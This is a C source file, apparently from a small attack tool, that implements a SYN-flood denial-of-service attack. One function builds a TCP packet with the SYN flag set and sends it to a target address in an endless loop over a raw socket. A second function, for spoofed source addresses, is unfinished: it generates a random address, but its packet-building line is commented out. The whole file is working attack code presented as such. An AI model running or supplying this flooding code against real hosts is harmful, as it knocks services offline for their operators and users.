#include "../include/SYNflooding.h"
#include "../include/iputils.h"

void signal_handler(int sig){
    printf("Ctrl-C detected, stopping attack\n");
    exit(0);
}

void syn_flooding_direct(const char* destination_address){
    signal(SIGINT, signal_handler);

    //We first get host's IP
    char host [256];
    struct in_addr in;
    gethostname(host, 256);
    struct hostent *host_ip;
    host_ip = gethostbyname(host);
    if(host_ip == NULL){
        perror("ERROR getting host IP");
        exit(1);
    }
    memcpy(&in.s_addr, *(host_ip->h_addr_list), sizeof(in.s_addr));

    packet_t packet = build_standard_packet(8080, 8080, inet_ntoa(in), destination_address, 4096, "SYN");
    set_TCP_flags(packet, 0x02);

    while(1){
        if (rawsocket_send(packet)<0){
            perror("ERROR sending the packet");
            exit(1);
        }
    }

}

void syn_flooding_spoofed(const char* destination_address){
    signal(SIGINT, signal_handler);

    const char* address = generate_random_address();
    generate_random_address();
    
    //packet_t packet = build_standard_packet(8000, 8000, address, destination_address, 4096, "SYN");

}